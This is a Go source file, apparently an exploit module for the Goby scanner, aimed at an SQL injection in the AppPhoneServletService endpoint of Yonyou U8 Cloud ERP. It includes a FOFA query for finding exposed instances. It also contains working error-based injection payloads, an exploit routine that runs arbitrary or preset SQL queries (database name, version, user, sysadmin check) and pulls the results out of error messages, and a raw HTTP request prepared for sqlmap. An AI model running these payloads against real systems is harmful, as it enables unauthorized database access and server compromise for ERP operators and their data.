package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou-U8-Cloud /nc.pubitf.erm.mobile.appservice.AppPhoneServletService SQL Injection Vulnerability",
    "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions.  </p><p>There is an SQL injection vulnerability in the interface of Yonyou U8 Cloud AppPhoneServletService, through which an unauthorized attacker can obtain database permissions, and further exploitation can lead to server compromise.</p>",
    "Product": "yonyou-U8-Cloud",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-02-27",
    "PostTime": "2024-08-13",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "GobyQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "Level": "1",
    "Impact": "<p>There is an SQL injection vulnerability in the interface of Yonyou U8 Cloud AppPhoneServletService, through which an unauthorized attacker can obtain database permissions, and further exploitation can lead to server compromise.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/136329317"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT 'abcdef'",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "yonyou-U8-Cloud /nc.pubitf.erm.mobile.appservice.AppPhoneServletService SQL 注入漏洞",
            "Product": "用友-U8-Cloud",
            "Description": "<p>用友U8 Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。&nbsp;</p><p>用友U8 Cloud AppPhoneServletService接口处存在SQL注入漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "yonyou-U8-Cloud /nc.pubitf.erm.mobile.appservice.AppPhoneServletService SQL Injection Vulnerability",
            "Product": "yonyou-U8-Cloud",
            "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions.&nbsp;&nbsp;</p><p>There is an SQL injection vulnerability in the interface of Yonyou U8 Cloud AppPhoneServletService, through which an unauthorized attacker can obtain database permissions, and further exploitation can lead to server compromise.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability in the interface of Yonyou U8 Cloud AppPhoneServletService, through which an unauthorized attacker can obtain database permissions, and further exploitation can lead to server compromise.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9933"
}`
	setSqlPayloadHashasniciaybcdbdcywbd3y22bhdyu2 := func(hostInfo *httpclient.FixUrl, sql string) (res string, vulurl string, err error) {
		//配置漏洞存在的路径
		vulurl = "/service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService"
		requestConfig := httpclient.NewPostRequestConfig(vulurl)
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.Header.Store("accountCode", "U8cloud")
		requestConfig.FollowRedirect = false
		requestConfig.Data = `module=sm&method=getUserInfoByPhone&phone=` + sql
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = fmt.Errorf("fail")
			return "", "", err
		}
		res = resp.RawBody
		return res, vulurl, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := goutils.RandomHexString(16)

			// 无法通过计算MD5等计算手段判断是否存在注入，因此设置了一个随机的固定的值，用于判断是否存在注入，默认情况下不会出现这个值
			sql := `1' and 1=(select '` + content + `')--+`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `varchar 值 '([\s\S]*?)' 转`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasniciaybcdbdcywbd3y22bhdyu2
			res, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(res, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
accountCode: U8cloud
 
module=sm&method=getUserInfoByPhone&phone=1' and 1=(select 'vdsnudnvks')--+`

			// 3.配置正则语句，从响应包中提取出数据
			regular := `varchar 值 '([\s\S]*?)' 转`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasniciaybcdbdcywbd3y22bhdyu2
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT DB_NAME()"
					} else if way == "db_version" {
						sql = "SELECT @@version"
					} else if way == "user_name" {
						sql = "SELECT user"
					} else if way == "is_admin" {
						sql = "SELECT IS_SRVROLEMEMBER('sysadmin')"
					}
				}
				sql = `1' and 1=(` + sql + `)--+`
				res, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(res, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = res
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
